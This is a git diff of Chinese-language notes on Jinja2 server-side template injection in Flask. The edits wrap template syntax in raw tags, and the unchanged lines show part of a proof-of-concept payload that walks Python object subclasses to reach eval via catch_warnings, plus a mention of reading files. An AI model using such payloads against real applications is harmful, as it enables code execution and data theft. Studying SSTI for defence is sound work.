@@ -16,17 +16,17 @@ Flask的两大核心组件:
 
 ### Jinja2语法
 
-- `{% ... %}` for [Statements](https://jinja.palletsprojects.com/en/3.0.x/templates/#list-of-control-structures)
-- `{{ ... }}` for [Expressions](https://jinja.palletsprojects.com/en/3.0.x/templates/#expressions) to print to the template output
+- `{% raw %}{% ... %}{% endraw %}` for [Statements](https://jinja.palletsprojects.com/en/3.0.x/templates/#list-of-control-structures) 
+- `{% raw %}{{ ... }}{% endraw %}` for [Expressions](https://jinja.palletsprojects.com/en/3.0.x/templates/#expressions) to print to the template output
 - `{# ... #}` for [Comments](https://jinja.palletsprojects.com/en/3.0.x/templates/#comments) not included in the template output
 
 ```python
-{# note: commented-out template because we no longer use this
+{% raw %}{# note: commented-out template because we no longer use this
     {% for user in users %}
     	{{ user }}
         ...
     {% endfor %}
-#}
+#}{% endraw %}
 ```
 
 ## Flask Demo
@@ -231,6 +231,7 @@ python3利用_frozen_importlib_external.FileLoader类的get_data方法读文件:
 理解原理后exp也很容易写出一两个. 以找catch_warnings下的eval这个builtin_func为例给出一个poc
 
 ```python
+{% raw %}
 {% for c in [].__class__.__base__.__subclasses__() %}
 {% if c.__name__ == 'catch_warnings' %}
   {% for b in c.__init__.__globals__.values() %}  
@@ -242,6 +243,7 @@ python3利用_frozen_importlib_external.FileLoader类的get_data方法读文件:
   {% endfor %}
 {% endif %}
 {% endfor %}
+{% endraw %}
 ```
 
 ![image-20211123173939095](Jinja2.assets/image-20211123173939095.png)  
